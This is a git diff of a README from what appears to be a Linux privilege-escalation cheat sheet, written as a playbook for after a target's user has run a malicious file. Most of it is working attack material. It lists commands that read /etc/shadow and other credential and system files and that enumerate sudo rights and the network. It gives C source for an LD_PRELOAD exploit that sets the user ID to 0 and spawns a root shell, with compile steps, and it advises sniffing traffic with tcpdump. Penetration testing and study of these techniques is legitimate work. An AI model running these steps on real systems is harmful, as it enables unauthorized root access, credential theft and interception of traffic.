@@ -4,38 +4,84 @@ Hi Folks! I made this repo that share the privilege escalation techniques I tend
 
 # Enumeration
 
-So, one of the your target companys users downloaded and executed a malicious file you happened to send them. You found credentials in clear text and connected back to the machine using SSH. What's the first thing you do? Identify where the hell are you and what you can do at this point of the engagement. For that I use the following commands:
+So, one of the your target company's users downloaded and executed a malicious file you happened to send them. You found credentials in clear text and connected back to the machine using SSH. What's the first thing you do? Identify where the hell are you and what you can do at this point of the engagement. For that I use the following commands:
 
-history (to identify previously executed commands in the shell)
-whoami, id ( to enumerate the user)
-cat /etc/passwd, cat etc/shadow, cat /etc/group (check if we can see the stored passwords, users, groups)
-ps aux, ps aux | grep root (to see unusual processes and processes run by the root user)
-hostname, uname -a, cat proc/version, cat /etc/issue, lscpu (to further enumerate the system, kernel version, errors..etc)
-sudo -l (to check which commands I can run as a super user without the password)
+## Some basic enumeration
+```sh
+history                            # identify previously executed commands in the shell
+whoami                             # enumerate the user
+id                                 # enumerate the user
+cat /etc/{passwd,shadow,group}     # check if we can see the stored passwords, users, groups
+cat /etc/{passwd,group}            # same but without shadow (usually 'Permission denied')
+ps aux | grep --ignore-case root   # see unusual processes and processes run by the root user
+```
 
-After executing sudo -l check the value of LD_PRELOAD, if you see something like this: env_keep += LD_PRELOAD. Than you can use the following little C script to gain root access:
+## Further enumeration of the system, kernel version, errors..etc
+```sh
+hostname
+hostname --all-{fqdns,ip-addresses}
+uname --kernel-{name,release,version}
+uname --all
+lscpu
+
+cat /proc/{version,issue}
+cat /etc/os-release
+
+# for modules
+lsmod
+lsmod | cut -d ' ' -f 1 | sort --unique
+
+# oneliner: outputs errors(e.g the usual shadow permission denied) to file `err`
+cat {/proc/{version,issue},/etc/{passwd,shadow,group,os-release}} 2>err
+
+sudo -l                            # to check which commands I can run as a super user without the password
+```
+
+After executing `sudo -l` check the value of LD_PRELOAD, \
+if you see something like this: `env_keep += LD_PRELOAD` - Than you can use the following little `C src` to gain root access:
+
+### C Source code
+
+in.c
+
+```c
+/*
+ * author: An00bis
+ * file: in.c
+ */
 
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
-void _init() {
+void _init(){
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/sh");
 }
+```
+
+### Compilation
+Usually, gcc is by default installed on most* systems.
+We can compile it with `gcc -o out.elf in.c`
+which takes `in.c` (our c source) 
+and outputs `out.elf` (a executable) \
+to run it: `./out.elf`
 
 
 # Network enumeration
 
-ifconfig (to see network interfaces, ip addresses..etc)
-ip a (alternative for ifconfig)
-arp -a (to check to ARP table and discover additional assets on the subnet)
-ip neigh (alternative for the arp command)
-ip route (to check the route table and discover gateways, additional IPs)
-netstat (to see active connections)
+```sh
+ifconfig   # to see network interfaces, ip addresses..etc
+ip a       # alternative for ifconfig
+ip -c a    # output in color
+arp -a     # check to ARP table and discover additional assets on the subnet
+ip neigh   # alternative for the arp command
+ip route   # check the route table and discover gateways, additional IPs
+netstat    # to see active connections
 
-wireshark
-tcpdump -i <interface> -s 65535 -w <file> 
+wireshark                                 # The network traffic analyzer - Wireshark
+tcpdump -i <interface> -s 65535 -w <file> # The command-line network traffic analyzer - TCPDump
+```
 
-(Try to sniff traffic, it's less noisy and you have more data to work with during the engagement)
+## Try to sniff traffic, it's less noisy and you have more data to work with during the engagement
